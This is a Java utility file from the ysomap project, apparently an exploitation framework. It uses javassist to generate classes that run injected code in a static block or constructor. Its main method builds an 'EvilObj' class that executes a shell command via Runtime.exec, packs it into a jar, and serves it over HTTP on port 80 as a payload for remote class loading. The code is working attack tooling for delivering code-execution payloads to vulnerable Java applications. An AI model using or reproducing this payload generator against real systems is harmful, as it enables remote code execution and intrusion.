package ysomap.util;

import javassist.*;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

/**
 * @author wh1t3P1g
 * @since 2020/2/17
 */
public class ClassFiles {


    public static byte[] makeClassWithStaticBlock(String classname, String body) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = makeEmptyClassFile(pool, classname, null);
        insertStaticBlock(cc, body);
        return cc.toBytecode();
    }

    public static byte[] makeJarFile(String classname, byte[] bytecodes) {
        try(ZipOutputStream zipout = new ZipOutputStream(new FileOutputStream("tmp.jar"))){
            ZipEntry entry = new ZipEntry(classname+".class");
            zipout.putNextEntry(entry);
            zipout.write(bytecodes);
        }catch (IOException e) {
            e.printStackTrace();
        }
        File jarFile = new File("tmp.jar");
        byte[] bytes = new byte[(int)jarFile.length()];
        try(FileInputStream fis = new FileInputStream(jarFile)){
            fis.read(bytes);
        }catch (IOException e){
            e.printStackTrace();
        }
        jarFile.delete();
        return bytes;
    }

    public static byte[] makeClassWithDefaultConstructor(String classname, String body) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass cc = makeEmptyClassFile(pool, classname, body);
        return cc.toBytecode();
    }

    public static CtClass makeEmptyClassFile(ClassPool pool, String classname, String body) throws Exception{
        CtClass cc = pool.makeClass(classname);
        CtConstructor constructor = CtNewConstructor.defaultConstructor(cc);
        if(body != null){
            constructor.insertAfter(body);
        }
        cc.addConstructor(constructor);
        return cc;
    }

    public static void insertStaticBlock(CtClass cc, String code) throws CannotCompileException {
        CtConstructor staticBlock = cc.makeClassInitializer();
        staticBlock.insertAfter(code);
    }

    public static void insertInterface(ClassPool pool, CtClass cc, Class<?> iface) throws NotFoundException {
        pool.insertClassPath(new ClassClassPath(iface));
        CtClass ifaceClazz = pool.get(iface.getName());
        cc.addInterface(ifaceClazz);
    }

    public static void insertMethod(CtClass cc, String methodName,
                                       String body, CtClass[] params,
                                       CtClass returnType, CtClass[] exceptions)
            throws CannotCompileException {
        CtMethod method = CtNewMethod.make(Modifier.PUBLIC,
                                    returnType, methodName,
                                    params, exceptions, body, cc);
        cc.addMethod(method);
    }



    public static void main(String[] args) throws Exception {
        String command = "ls";
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        byte[] bytecodes = ClassFiles.makeClassWithDefaultConstructor("EvilObj",cmd);
        byte[] jar = ClassFiles.makeJarFile("EvilObj", bytecodes);
        HTTPHelper.PayloadHandler handler = new HTTPHelper.PayloadHandler(jar);
        HTTPHelper.makeSimpleHTTPServer(80, "/EvilObj.jar", handler);
    }
}
